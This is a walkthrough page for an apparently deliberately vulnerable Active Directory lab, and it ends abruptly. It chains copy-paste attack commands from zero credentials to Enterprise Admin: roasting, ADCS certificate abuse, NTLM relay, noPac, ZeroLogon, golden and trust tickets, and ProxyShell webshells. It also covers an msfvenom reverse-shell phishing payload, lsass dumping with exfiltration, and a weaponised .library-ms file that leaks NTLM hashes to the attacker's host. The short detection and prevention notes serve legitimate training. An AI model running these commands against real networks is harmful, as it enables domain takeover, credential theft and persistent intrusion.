# 08 — Canonical Solve Path + Wireframe Diagrams

This is the page to read after you've skimmed the rest. It pulls the per-ID writeups together into:

1. A **canonical end-to-end solve** — zero credentials to Enterprise Admin across all three forests.
2. **Wireframe diagrams** of every major solving pattern. Each pattern is a sequence of techniques chained together. The big-picture pattern is in `00-index.md`; the per-pattern detail is here.

---

## 1. Canonical solve — zero → Enterprise Admin

Assume you're on **your own Kali / BlackArch** with reach into `10.10.0.0/21`, `10.20.0.0/24`, `10.30.0.0/24` from the host bridge — no credentials, no AD position, no foothold on any lab VM. Target: `Administrator@root.corp`.

> Phase 0 (Initial Access, IA-001..050) covers every zero-cred entry vector in detail — see [`02a-initial-access.md`](02a-initial-access.md). The canonical solve below uses **AS-REP roast → spray** as the cheapest IA path. Alternatives that skip steps 1-2 entirely: ZeroLogon (DC$ hash directly, IA-014), PetitPotam+relay to ADCS (DC cert directly, IA-013), phishing a ws01 user (beacon → in-memory creds, IA-019..024).

```
STEP 0  ── Recon from Kali ────────────────────────────────
  nxc smb 10.10.0.0/21
  → enumerate hosts, OS, SMB signing status
  nxc ldap 10.10.0.10 -u '' -p ''                       # anon LDAP bind works
  bloodhound-python -u guest -p '' -d corp.local -ns 10.10.0.10 -c all
  → import to BloodHound, mark high-value: DA, EA, krbtgt, ADCS templates
```

```
STEP 1  ── Foothold #1: AS-REP roast ──────────────────────
  impacket-GetNPUsers corp.local/ -dc-ip 10.10.0.10 -no-pass -usersfile users.txt
  → hash for svc_nopreauth
  hashcat -m 18200 asrep.hashes rockyou.txt
  → password recovered

STEP 1' ── Alternative foothold: spray ─────────────────────
  kerbrute passwordspray -d corp.local --dc 10.10.0.10 users.txt 'Password123!'
  → alice : Password123!
```

```
STEP 2  ── Domain user ──────────────────────────────────
  bloodhound-python -u alice -p '<pw>' -d corp.local -ns 10.10.0.10 -c all
  → full graph, paths to DA visible
```

```
STEP 3  ── Pick the shortest path ────────────────────────
  Path A: Kerberoast -> crack -> DA via service account
  Path B: ADCS ESC1/8 -> cert as DA
  Path C: Coerce + NTLM Relay -> ADCS ESC8 -> DC$ cert -> DCSync
  Path D: noPac (CVE-2021-42278/42287)
  Path E: ACL chain (WriteOwner Domain Admins, GenericWrite, etc.)
```

Below is **Path B** — the fastest in DVAD:

```
STEP 3.B  ── ADCS ESC1 chain ──────────────────────────────
  certipy find -u alice -p '<pw>' -dc-ip 10.10.0.10 -vulnerable -stdout
  → ESC1Template found

  certipy req -u alice -p '<pw>' -ca corp-CA-CA \
     -template ESC1Template -upn Administrator@corp.local \
     -target ca01.corp.local
  → administrator.pfx

  certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
  → NT hash for Administrator@corp.local
```

```
STEP 4  ── DA on corp.local ──────────────────────────────
  impacket-secretsdump corp.local/Administrator@10.10.0.10 -hashes :<NT>  -just-dc
  → krbtgt hash, all user NT hashes, machine secrets
```

```
STEP 5  ── Forge Golden TGT (persistence + cross-domain) ─
  impacket-ticketer -nthash <KRBTGT_HASH> \
     -domain-sid S-1-5-21-CORP \
     -domain corp.local \
     -extra-sid S-1-5-21-CORP-EU-519 \
     -extra-sid S-1-5-21-ROOT-519 \
     Administrator
  export KRB5CCNAME=Administrator.ccache
```

```
STEP 6  ── Cross domain to root.corp (Enterprise Admin) ──
  impacket-secretsdump -k -no-pass -just-dc \
     -target-ip 10.30.0.10 root.corp/Administrator@dc01.root.corp
  → EA hash; you are Enterprise Admin in root.corp
```

```
STEP 7  ── Cross trust to finance.local ──────────────────
  # forge inter-realm TGT with trust key
  impacket-ticketer -nthash <TRUSTKEY_NT> \
     -domain-sid S-1-5-21-CORP \
     -domain corp.local \
     -spn 'krbtgt/finance.local' \
     Administrator
  → use to request TGS into finance.local resources
```

```
STEP 8  ── Persistence (pick at least one) ───────────────
  - Golden Certificate (CA private key) → durable across rotations
  - AdminSDHolder ACL backdoor          → self-healing every 60 min
  - DSRM backdoor                       → DC-local PtH path
  - GPO immediate-task on Default Domain Policy → re-pwn on every reboot
```

Done. ~45 minutes if everything goes smoothly; ~3-4 hours if you stop to learn what each step does.

---

## 2. Wireframe — Pattern A: Kerberoast chain

```
┌──────────────┐     impacket-GetUserSPNs    ┌──────────────────────────┐
│ Domain User  │ ─────────────────────────▶  │ TGS for svc_web (RC4)    │
│ (alice)      │                              │ TGS encrypted w/ svc_web │
└──────────────┘                              │ NT hash                  │
                                              └────────────┬─────────────┘
                                                           │ hashcat -m 13100
                                                           ▼
                                              ┌──────────────────────────┐
                                              │ Plaintext: Summer2023!   │
                                              └────────────┬─────────────┘
                                                           ▼
                       ┌──────────────────────────────────────────────┐
                       │ svc_web is local admin somewhere?  → PtH/PtT │
                       │ svc_web has constrained deleg?   → S4U2Proxy  │
                       │ svc_web in Server Operators?     → SCM → SYSTEM│
                       └──────────────────────────────────────────────┘
```

Detect: 4769 RC4 + bulk; honeypot SPN. Prevent: AES-only; gMSAs; 25+ char random svc pwds.

**Commands (copy-paste):**

```bash
# 1. Enumerate SPN-bearing accounts and request TGSes (RC4)
impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request -outputfile spns.kerberoast

# 2. Crack offline
hashcat -m 13100 spns.kerberoast /usr/share/wordlists/rockyou.txt --force

# 3. Use the recovered password (svc_web)
nxc smb 10.10.0.13 -u svc_web -p 'Summer2023!'                       # local admin?
nxc ldap 10.10.0.10 -u svc_web -p 'Summer2023!' --kerberoasting all  # second-hop
impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator corp.local/svc_web:'Summer2023!'   # if constrained
```

---

## 3. Wireframe — Pattern B: ADCS ESC1

```
┌──────────────┐  certipy find              ┌─────────────────────────┐
│ Domain User  │ ─────────────────────────▶ │ ESC1Template            │
└──────┬───────┘                            │  - Client Auth EKU      │
       │                                     │  - ENROLLEE_SUPPLIES_   │
       │                                     │    SUBJECT             │
       │                                     │  - Domain Users enroll │
       │                                     │  - No manager approval │
       │                                     └────────────┬────────────┘
       │ certipy req -upn Administrator@corp.local        │
       ▼                                                   ▼
┌─────────────────────────┐                  ┌─────────────────────────┐
│  Cert for Administrator │ ◀──────────────  │ Enterprise CA issues    │
│  (pfx)                  │                  │ cert with SAN = Admin   │
└──────┬──────────────────┘                  └─────────────────────────┘
       │ certipy auth (PKINIT)
       ▼
┌─────────────────────────┐
│ TGT + NT hash for       │
│ Administrator           │
└─────────────────────────┘
```

Detect: 4886/4887 with requester≠SAN. Prevent: drop `ENROLLEE_SUPPLIES_SUBJECT` on Client-Auth templates; require approval.

**Commands (copy-paste):**

```bash
# 1. Find vulnerable templates
certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -stdout -vulnerable

# 2. Request a cert as Administrator using ESC1
certipy req -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
            -ca 'CORP-CA' -template 'ESC1Template' -upn 'Administrator@corp.local'

# 3. PKINIT → TGT + NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10

# 4. DCSync with the recovered hash
impacket-secretsdump -hashes :<NT> -just-dc corp.local/Administrator@10.10.0.10
```

---

## 4. Wireframe — Pattern C: Coerce + Relay → ESC8

```
┌────────────┐  EFSRPC OpenFileRaw    ┌─────────────────┐
│ Attacker   │ ─────────────────────▶ │ DC01 (target)   │
│ (PetitPotam│                         └────────┬────────┘
│  client)   │                                  │
└────────────┘                                  │ DC01$ auth (NTLM)
   ▲                                            │ to attacker UNC
   │  send NTLM challenge from CA web enrollment
   │  back to DC01
   │                                            ▼
┌──┴───────────────────────┐  relay NTLM   ┌─────────────────────┐
│ ntlmrelayx (--adcs       │ ◀────────────│  Attacker host      │
│ --template               │               │  (listens 445/80)   │
│ DomainController)        │               └─────────────────────┘
└──┬───────────────────────┘
   │ relayed creds to
   │ http://ca01/certsrv
   ▼
┌──────────────────────────┐
│ CA issues cert for DC01$ │
│ Domain Controller EKU    │
└──┬───────────────────────┘
   │ gettgtpkinit.py / certipy auth
   ▼
┌──────────────────────────┐
│ TGT for DC01$ + NT hash  │ → DCSync → DA
└──────────────────────────┘
```

Detect: MDI ESC8; 4624 from DC$ to attacker IP; ADCS issuance to DC$ from non-DC. Prevent: disable NTLM on ADCS web; EPA; HTTPS only; KB5005413 RPC filter.

**Commands (copy-paste):**

```bash
# 1. Start ntlmrelayx targeting the ADCS web enrollment with DomainController template
sudo impacket-ntlmrelayx -t http://10.10.0.12/certsrv/certfnsh.asp \
                         --adcs --template DomainController -smb2support &

# 2. Coerce DC01$ to authenticate to your attacker IP (10.10.0.1)
impacket-PetitPotam -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.1 10.10.0.10
# (or: impacket-coercer -u alice -p 'DVADlab2024!' -d corp.local -t 10.10.0.10 -l 10.10.0.1)

# 3. Take the base64 cert ntlmrelayx prints; convert to PFX and use PKINIT
echo '<b64>' | base64 -d > dc01.pfx
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.10 -username 'dc01$' -domain corp.local

# 4. DCSync as DC01$ → krbtgt
impacket-secretsdump -k -no-pass -just-dc-user krbtgt corp.local/dc01\$@dc01.corp.local
```

---

## 5. Wireframe — Pattern D: RBCD

```
                         ┌──────────────────┐
                         │ Domain User      │
                         │ alice (MAQ=10)   │
                         └────────┬─────────┘
                                  │
                                  │ impacket-addcomputer
                                  ▼
                         ┌──────────────────┐
                         │ evil$ (attacker- │
                         │   owned machine) │
                         └────────┬─────────┘
                                  │
                                  │ rbcd.py: write msDS-AllowedToActOnBehalfOf
                                  │ on target (ws01$)
                                  ▼
                         ┌──────────────────┐
                         │ ws01$ allows     │
                         │ evil$ delegation │
                         └────────┬─────────┘
                                  │ getST -impersonate Administrator
                                  │     -spn cifs/ws01.corp.local
                                  │     evil$ ccache
                                  ▼
                         ┌──────────────────┐
                         │ TGS as Admin@    │
                         │ cifs/ws01        │
                         └────────┬─────────┘
                                  │ psexec -k -no-pass
                                  ▼
                         ┌──────────────────┐
                         │ SYSTEM on ws01   │
                         └──────────────────┘
```

Detect: 4741 (computer created by non-admin), 5136 on `msDS-AllowedToActOnBehalfOfOtherIdentity`. Prevent: MachineAccountQuota=0; restrict RBCD writes.

**Commands (copy-paste):**

```bash
# 1. Create attacker-controlled machine account (MAQ=10 in DVAD)
impacket-addcomputer corp.local/alice:'DVADlab2024!' -computer-name 'evil$' \
                     -computer-pass 'EvilPass1!' -dc-ip 10.10.0.10

# 2. Write RBCD attribute on the target (e.g., ws01$)
impacket-rbcd -delegate-from 'evil$' -delegate-to 'ws01$' -dc-ip 10.10.0.10 \
              -action write corp.local/alice:'DVADlab2024!'

# 3. S4U2Self+S4U2Proxy as evil$ impersonating Administrator
impacket-getST -spn cifs/ws01.corp.local -impersonate Administrator \
               corp.local/evil\$:'EvilPass1!' -dc-ip 10.10.0.10

# 4. Use the ticket
export KRB5CCNAME=Administrator@cifs_ws01.corp.local@CORP.LOCAL.ccache
impacket-psexec -k -no-pass ws01.corp.local
```

---

## 6. Wireframe — Pattern E: noPac (CVE-2021-42278/42287)

```
alice                                                    DC01
  │  addcomputer evil$  (MAQ=10)                          │
  │ ──────────────────────────────────────────────────▶   │
  │                                                       │ ok
  │ rename evil$ -> dc01    (no trailing $)               │
  │ ──────────────────────────────────────────────────▶   │
  │                                                       │
  │ TGT request (S4U2Self for "dc01")                     │
  │ ──────────────────────────────────────────────────▶   │
  │                              ◀───────── TGT for dc01 (KDC thinks DC) │
  │                                                       │
  │ rename dc01 -> evil$ back                             │
  │ ──────────────────────────────────────────────────▶   │
  │                                                       │
  │ S4U2Proxy: ask for cifs/dc01 ticket as Administrator  │
  │ ──────────────────────────────────────────────────▶   │
  │                              ◀───────── TGS for Admin@cifs/dc01      │
  │                                                       │
  │ secretsdump -k -no-pass on dc01                       │
  │ ──────────────────────────────────────────────────▶   │
  │                                              krbtgt dumped
```

Detect: 4741+4742+4624 mismatched name; MDI noPac. Prevent: patch KB5008380; MAQ=0.

**Commands (copy-paste):**

```bash
# DVAD: corp.local has MAQ=10 and is unpatched against noPac.
impacket-noPac.py corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
                  -dc-host dc01.corp.local -shell --impersonate Administrator

# Or via impacket-addcomputer + manual rename:
impacket-addcomputer corp.local/alice:'DVADlab2024!' -computer-name 'evil$' \
                     -computer-pass 'EvilPass1!' -dc-ip 10.10.0.10
impacket-renameMachine corp.local/alice:'DVADlab2024!' -current-name 'evil$' -new-name 'dc01' -dc-ip 10.10.0.10
impacket-getTGT corp.local/dc01:'EvilPass1!' -dc-ip 10.10.0.10
impacket-renameMachine corp.local/alice:'DVADlab2024!' -current-name 'dc01' -new-name 'evil$' -dc-ip 10.10.0.10
KRB5CCNAME=dc01.ccache impacket-getST -self -impersonate Administrator -spn 'cifs/dc01.corp.local' -k -no-pass corp.local/dc01
KRB5CCNAME=Administrator.ccache impacket-secretsdump -k -no-pass dc01.corp.local
```

---

## 7. Wireframe — Pattern F: ZeroLogon (CVE-2020-1472)

```
attacker                                       DC01 (vuln)
   │ NetrServerAuthenticate2(zeros)            │
   │ ─────────────────────────────────────▶   │  (~256 attempts on avg)
   │                                            │  Netlogon AES-CFB8 IV=0 bug
   │                            ◀───── auth OK │  with all-zeros credential
   │                                            │
   │ NetrServerPasswordSet2(empty)              │
   │ ─────────────────────────────────────▶   │
   │                                            │  DC$ password = empty
   │ secretsdump -no-pass DC01$@DC01            │
   │ ─────────────────────────────────────▶   │
   │                            ◀───── krbtgt + everything
   │
   │  *** restore DC$ pwd ***                   │
   │  ─────────────────────────────────────▶   │  reinstall_original_pw.py
```

Detect: MDI native; Event 5827. Prevent: patch August 2020; `FullSecureChannelProtection=1`.

**Commands (copy-paste):**

```bash
# 1. Verify the DC is vulnerable
python3 zerologon_tester.py DC01 10.10.0.10

# 2. Reset DC01$ machine password to empty
python3 set_empty_pw.py DC01 10.10.0.10

# 3. DCSync as DC01$ with empty password
impacket-secretsdump -no-pass -just-dc corp.local/dc01\$@10.10.0.10

# 4. Forge Golden Ticket with the krbtgt hash (now you are EA)
impacket-ticketer -nthash <krbtgt_nt> -domain-sid <CORP_SID> -domain corp.local Administrator

# 5. CRITICAL: restore the original DC$ pwd from the secretsdump output
python3 reinstall_original_pw.py DC01 10.10.0.10 <original_hex_pw>
```

---

## 8. Wireframe — Pattern G: ExtraSID (Parent → Child)

```
eu.corp.local DA  (already compromised)
   │
   │ DCSync krbtgt of eu.corp.local
   │
   │ mimikatz kerberos::golden
   │   /user:Administrator
   │   /domain:eu.corp.local
   │   /sid:S-1-5-21-EU
   │   /sids:S-1-5-21-CORP-519,         <-- Enterprise Admins parent
   │         S-1-5-21-CORP-512          <-- Domain Admins parent
   │   /krbtgt:<eu krbtgt hash>
   │
   ▼
TGT with foreign privileged SIDs
   │
   │ DCSync corp.local krbtgt
   ▼
Domain Admin on corp.local (=Enterprise Admin in single-tree forest)
```

Detect: MDI SID history. Prevent: parent-child SID filtering doesn't exist — *modern recommendation is a single-domain forest*.

**Commands (copy-paste):**

```bash
# Prereq: you already have DA on eu.corp.local (child). Then:

# 1. Get child's krbtgt hash + SIDs
impacket-secretsdump -just-dc-user krbtgt eu.corp.local/Administrator@10.10.0.11
impacket-lookupsid eu.corp.local/Administrator@10.10.0.11 | grep -i 'krbtgt\|domain'

# 2. Get parent (corp.local) domain SID
impacket-lookupsid corp.local/alice:'DVADlab2024!'@10.10.0.10 | head -5

# 3. Forge Golden Ticket in CHILD with parent EA/DA SIDs appended via /sids
impacket-ticketer -nthash <eu_krbtgt_nt> -domain-sid <EU_SID> -domain eu.corp.local \
                  -extra-sid <CORP_SID>-519,<CORP_SID>-512 Administrator

# 4. Use it to DCSync the PARENT
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@dc01.corp.local
```

---

## 9. Wireframe — Pattern H: Golden Ticket persistence

```
DCSync krbtgt
   │
   ▼
NT hash of krbtgt
   │ mimikatz kerberos::golden /user:any /id:500 /groups:512,519,...
   ▼
Forged TGT for any principal
   │ inject (ptt)
   ▼
Auth to any service for ~10 years
   │
   ▼
KDC never created TGT (no 4768) → MDI "Golden Ticket usage" alert
```

Detect: 4769 with no preceding 4768 same TGT; 21 ticket lifetime / weird PAC. Prevent: rotate krbtgt **twice**; tier-0; monitor 4769s.

**Commands (copy-paste):**

```bash
# Prereq: krbtgt NT hash (from DCSync) + domain SID.
# DVAD bakes krbtgt=KrbtgtDVAD2024! so this is reproducible.

# 1. Compute krbtgt NT hash from the known plaintext
python3 -c "import hashlib; print(hashlib.new('md4', 'KrbtgtDVAD2024!'.encode('utf-16-le')).hexdigest())"

# 2. Forge a 10-year Golden Ticket for any principal
impacket-ticketer -nthash <krbtgt_nt> -domain-sid <CORP_SID> -domain corp.local Administrator

# 3. Use it
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc01.corp.local
```

---

## 10. Wireframe — Pattern I: Cross-forest via SID History + Trust key

```
corp.local DA
   │
   │ secretsdump -just-dc -user 'CORP$' on dc01.corp.local
   │ extract trust key  (corp.local <-> finance.local)
   │
   ▼
Trust key NT hash
   │ mimikatz kerberos::golden
   │   /domain:corp.local
   │   /sid:S-1-5-21-CORP
   │   /sids:S-1-5-21-FINANCE-519       <-- foreign EA SID
   │   /rc4:<trustkey hash>
   │   /service:krbtgt
   │   /target:finance.local
   │
   ▼
Inter-realm TGT
   │ Rubeus asktgs /service:cifs/dc01.finance.local
   ▼
TGS for finance.local
   │
   ▼
DCSync krbtgt of finance.local
```

Detect: MDI SID history; abnormal cross-realm `4769`. Prevent: SID filtering on every external trust; selective auth; rotate trust keys.

**Commands (copy-paste):**

```bash
# Prereq: DA on corp.local (parent of trust); DVAD trust key = TrustKey2024!

# 1. Dump the trust key for corp.local <-> finance.local
impacket-secretsdump -just-dc-user 'finance.local$' corp.local/Administrator@10.10.0.10

# 2. Get foreign SID (finance.local Enterprise Admins = <FIN_SID>-519)
impacket-lookupsid corp.local/Administrator@10.10.0.10 'finance.local'

# 3. Forge inter-realm TGT (golden trust ticket)
impacket-ticketer -nthash <trustkey_nt> -domain-sid <CORP_SID> \
                  -domain corp.local -extra-sid <FIN_SID>-519 \
                  -spn 'krbtgt/finance.local' Administrator

# 4. Ask for a service ticket in the foreign forest and DCSync
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn cifs/dc01.finance.local -impersonate Administrator corp.local/Administrator
impacket-secretsdump -k -no-pass -just-dc finance.local/Administrator@dc01.finance.local
```

---

## 10a. Wireframe — Pattern J: Phishing → ws01 foothold → in-memory creds

```
┌────────────────┐  GoPhish / evilginx          ┌──────────────────────┐
│ Attacker Kali  │ ───────── email ───────────▶ │ user@corp.local      │
│ (10.10.0.1)    │   .lnk / .iso / .hta /       │ (reads on ws01)      │
│                │   library-ms / macro doc     └──────────┬───────────┘
└────────┬───────┘                                          │ double-click
         │ HTTPS C2 listener (Sliver / Mythic / Havoc)      │ payload runs
         │                                                  │ in user context
         │                              ◀────── reverse HTTPS beacon
         │                                                  ▼
         │                                       ┌──────────────────────┐
         │                                       │ ws01.corp.local      │
         │                                       │ — Defender disabled  │
         │                                       │ — user is local admin│
         │                                       └──────────┬───────────┘
         │                                                  │ lsass dump
         │                              ◀────── NT hashes / TGTs of all
         │                                       interactive sessions
         │                                                  │
         │  SOCKS5 over beacon                              │
         ▼                                                  ▼
┌────────────────────────┐                       ┌──────────────────────┐
│ proxychains nxc / bh / │ ◀────────────────────│ pivot through ws01   │
│ certipy from Kali      │                       │ to dc01, ca01, etc.  │
└────────────────────────┘                       └──────────────────────┘
```

Detect: Office spawning cmd/powershell (Sysmon 1, parent chain); LNK execution from %TEMP%; LSASS handle open with 0x1010; outbound HTTPS to non-CDN IP; ASR rules.
Prevent: ASR ("block Office child processes"); MOTW respected; Smart App Control; LSA Protection; Credential Guard; AV/EDR on workstations (DVAD has it off on purpose).

**Commands (copy-paste):**

```bash
# 1. Build a macro doc / .lnk / .library-ms payload that fetches your stage-2
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f hta-psh > stage1.hta
python3 -m http.server 8080   # serve stage1.hta + payload

# 2. After detonation on ws01 — dump lsass via comsvcs.dll (no mimikatz install)
# (run inside the beacon shell on ws01)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Users\Public\l.dmp full

# 3. Exfil and parse offline with pypykatz
scp ... l.dmp .
pypykatz lsa minidump l.dmp

# 4. Pivot via SOCKS5
proxychains4 -q nxc smb 10.10.0.13 -u alice -H <NTLM>
```

---

## 10b. Wireframe — Pattern K: mitm6 from attacker bridge

```
┌────────────────┐   DHCPv6 advertise         ┌────────────────────┐
│ Attacker Kali  │ ────── (every machine ───▶ │ Windows hosts on   │
│ 10.10.0.1      │        prefers IPv6) ────▶ │ corp.local subnet  │
│ mitm6 -d corp  │                            └─────────┬──────────┘
└────────┬───────┘                                       │
         │  attacker = primary DNS over IPv6             │ resolve wpad.corp.local
         │                              ◀────────────────┘
         │  serve WPAD → proxy → 407 NTLM challenge
         │
         │  NTLM auth from victim WORKSTATION$ (machine acct)
         ▼
┌──────────────────────────┐  relay to        ┌────────────────────┐
│ ntlmrelayx -6            │  ldap://dc01     │ DC01.corp.local    │
│   -t ldaps://dc01        │ ───────────────▶ │ add new attacker   │
│   -wh wpad.corp.local    │                  │ machine acct +     │
│   --delegate-access      │                  │ set RBCD on victim │
└──────────────────────────┘                  └─────────┬──────────┘
                                                         │ getST -impersonate Administrator
                                                         ▼
                                              ┌────────────────────┐
                                              │ SYSTEM on victim   │
                                              └────────────────────┘
```

Detect: unsolicited DHCPv6; NTLM auth from machine account to attacker IP; 4741 (computer created by non-admin); 5136 on msDS-AllowedToActOnBehalfOf.
Prevent: disable IPv6 if unused, or RA Guard / DHCPv6 Guard on switches; deploy `wpad` A-record to a sinkhole; LDAP signing + channel binding; SMB signing required; MachineAccountQuota=0.

**Commands (copy-paste):**

```bash
# 1. Become the IPv6 router + DNS on the segment
sudo mitm6 -d corp.local -i <attacker_iface>

# 2. In parallel, relay any inbound NTLM (machine accts auto-auth) to LDAPS
#    --delegate-access creates evil$ + writes RBCD on the victim
sudo impacket-ntlmrelayx -6 -t ldaps://dc01.corp.local -wh wpad.corp.local \
                         --delegate-access --no-smb-server

# 3. After ntlmrelayx logs "set msDS-AllowedToActOnBehalfOfOtherIdentity"
impacket-getST -spn cifs/<victim>.corp.local -impersonate Administrator \
               corp.local/<evil_machine>\$:'<pwd_from_relay_output>' -dc-ip 10.10.0.10

# 4. SYSTEM on the victim
export KRB5CCNAME=Administrator@cifs_<victim>.corp.local@CORP.LOCAL.ccache
impacket-psexec -k -no-pass <victim>.corp.local
```

---

## 10c. Wireframe — Pattern L: ProxyShell unauth → mailbox → LPE

```
┌────────────────┐  GET /autodiscover/autodiscover.json?@evil  ┌───────────┐
│ Attacker Kali  │ ─────────────────────────────────────────▶ │ Exchange  │
│                │  (SSRF — CVE-2021-34473)                    │ OWA       │
└────────┬───────┘                              ◀────── path  └─────┬─────┘
         │  POST /powershell?X-Rps-CAT=... (CVE-2021-34523)         │
         │  → New-MailboxExportRequest (CVE-2021-31207)             │
         │                                                          ▼
         │                                               ┌────────────────────┐
         │                              ◀────── shell ── │ Write .aspx to     │
         │                                               │ public mailbox     │
         │                                               │ → IIS execution    │
         │                                               └─────────┬──────────┘
         │ NETWORK SERVICE on Exchange                              │
         ▼                                                          │
┌──────────────────────────┐                                        │
│ Exchange machine acct    │ ◀──────────────────────────────────────┘
│ has WriteDACL on Domain  │
│ object (pre-Nov 2019)    │ ── DCSync ──▶ Domain Admin
└──────────────────────────┘
```

Detect: 401/200 on /autodiscover.json with weird @host; ASPX in mailbox export paths; w3wp spawning powershell.
Prevent: patch (KB5003435+); EM/EAC URL rewrite rule; remove pre-Nov-2019 Exchange privileges (Active Directory split permissions); EWS throttling.

**Commands (copy-paste):**

```bash
# NOTE: DVAD does not ship Exchange by default — this pattern is documented for
# operators who add a vulnerable Exchange VM to extend the lab.

# 1. Identify Exchange + email enumeration
python3 ProxyShell.py -t https://exchange.corp.local -e Administrator@corp.local

# 2. Drop webshell via mailbox export (CVE chain CVE-2021-34473/34523/31207)
python3 ProxyShell-Auto.py --target exchange.corp.local --email Administrator@corp.local

# 3. Webshell → command exec → DCSync (Exchange has WriteDACL on Domain pre-Nov-2019)
curl 'https://exchange.corp.local/aspnet_client/shell.aspx?cmd=whoami'
```

---

## 10d. Wireframe — Pattern M: SCCM PXE boot (no-password) → NAA harvest

```
┌────────────────┐  DHCP option 60/66/67       ┌────────────────────┐
│ Attacker Kali  │ ─── boot from PXE  ────────▶│ SCCM DP / WDS      │
│ + pxeboot.py   │                              │ ws-pxe.corp.local  │
└────────┬───────┘                              └─────────┬──────────┘
         │                                                 │ TFTP boot.wim
         │                              ◀───────── policy.xml + media
         │
         │  decrypt media variables file with empty pwd
         ▼
┌──────────────────────────┐
│ Network Access Account   │
│ (NAA) cleartext creds in │
│ TS variables             │
└──────────┬───────────────┘
           │ NAA = domain user with content access
           ▼
┌──────────────────────────┐
│ Pivot: NAA is often      │
│ over-privileged →        │
│ access to SCCM site DB → │
│ site admin → DA          │
└──────────────────────────┘
```

Detect: PXE boots from unexpected MAC; SCCM audit on policy retrieval; abnormal AdminService / SMS Provider calls.
Prevent: PXE password enforced; enhanced HTTP / PKI mode; NAA deprecated → use enhanced HTTP enrollment; tier SCCM admins.

**Commands (copy-paste):**

```bash
# NOTE: DVAD doesn't ship SCCM; pattern documented for operators who add it.

# 1. PXE boot from attacker VM on same L2
python3 PXEThief.py -d corp.local --target ws-pxe.corp.local
# OR boot a UEFI shell, capture WIM/SDI variable file

# 2. Decrypt the TS variables file (empty PXE password ⇒ blob is decryptable)
python3 pxe_thief_decrypt.py policy.xml

# 3. Use the recovered NAA credentials
nxc smb 10.10.0.0/24 -u <NAA_USER> -p '<NAA_PASS>'
```

---

## 10e. Wireframe — Pattern N: USB / LNK drop (HID + library-ms)

```
┌────────────────┐   physical drop             ┌──────────────────────┐
│ Attacker (you) │ ── "Salaries Q3.zip" ──────▶│ User on ws01         │
│ packaged ZIP   │     contains .library-ms    │ unzips, Explorer     │
│ w/ .library-ms │     → CVE-2025-24071        │ previews .library-ms │
└────────┬───────┘                              └──────────┬───────────┘
         │  responder -wIv eth0                            │ NTLM auth
         │  (or smbserver.py)                              │ to attacker
         │                                                 │ SMB share
         │                              ◀──── WORKSTATION$ ──────────────┐
         │                                  + user NTLMv2 hash           │
         │                                                                ▼
         │  hashcat -m 5600 (NTLMv2)                       ┌──────────────────┐
         ▼                                                  │ User credential  │
┌────────────────────┐                                      └──────────────────┘
│ Cracked NT hash    │
│ → spray, pivot,    │
│ Kerberoast, etc.   │
└────────────────────┘
```

Detect: NTLM auth from internal client to RFC1918 attacker IP; SMB outbound from workstation to non-server; ASR rule "block USB executables."
Prevent: disable AutoPlay; block `.library-ms` MIME / strip from email; ASR rules; SMB signing required; Block outbound 445 from clients; KB5044284 for CVE-2025-24071.

**Commands (copy-paste):**

```bash
# 1. Build a .library-ms with UNC pointing at your attacker IP
cat > 'Salaries_Q3.library-ms' <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation><url>\\10.10.0.1\share</url></simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
EOF
zip 'Salaries_Q3.zip' 'Salaries_Q3.library-ms'

# 2. Run Responder OR a fake SMB to capture NTLMv2 when victim previews
sudo responder -I <attacker_iface> -wv

# 3. Crack
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 10f. Wireframe — Pattern P: ExtraSID (Child → Parent, finance.local variant)

DVAD has parent-child trust `corp.local` ↔ `eu.corp.local` and external trusts to
`finance.local` and `root.corp`. Pattern G covered `eu` → `corp`. Pattern P is the
same primitive applied to the alternate path (corp → eu) and useful when you
land on `dc01.eu` first and need to pivot down a tier.

```
corp.local DA  ──DCSync krbtgt─▶  forge inter-realm TGT with /sids:<EU-DA-SID>
                                 ──asktgs cifs/dc01.eu──▶ EU SYSTEM
```

**Commands:**

```bash
impacket-secretsdump -just-dc-user krbtgt corp.local/Administrator@10.10.0.10
impacket-lookupsid corp.local/Administrator@10.10.0.10 'eu.corp.local' | head
impacket-ticketer -nthash <corp_krbtgt_nt> -domain-sid <CORP_SID> \
                  -domain corp.local -extra-sid <EU_SID>-512 \
                  -spn 'krbtgt/eu.corp.local' Administrator
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn cifs/dc01.eu.corp.local -impersonate Administrator corp.local/Administrator
impacket-secretsdump -k -no-pass -just-dc eu.corp.local/Administrator@dc01.eu.corp.local
```

---

## 10g. Wireframe — Pattern Q: Trust Key forge → finance.local (external trust)

Identical to Pattern I but written out per-DVAD-host so the SIDs and DNS names
are concrete. External trust → SID filtering is **disabled** in DVAD on every
external trust (the lab spec says so).

```
Dump trust-account hash for FINANCE$/corp.local → forge inter-realm TGT
→ TGS for cifs/dc01.finance.local → DCSync finance.local
```

**Commands:**

```bash
# 1. Trust key dump (run as Administrator@corp.local)
impacket-secretsdump -just-dc-user 'FINANCE$' corp.local/Administrator@10.10.0.10

# 2. Get finance EA SID
impacket-lookupsid finance.local/<low_priv>:'<pw>'@10.20.0.10 | grep -i 'enterprise'

# 3. Forge inter-realm TGT
impacket-ticketer -nthash <FINANCE_trustkey_nt> -domain-sid <CORP_SID> \
                  -domain corp.local -extra-sid <FIN_SID>-519 \
                  -spn 'krbtgt/finance.local' Administrator

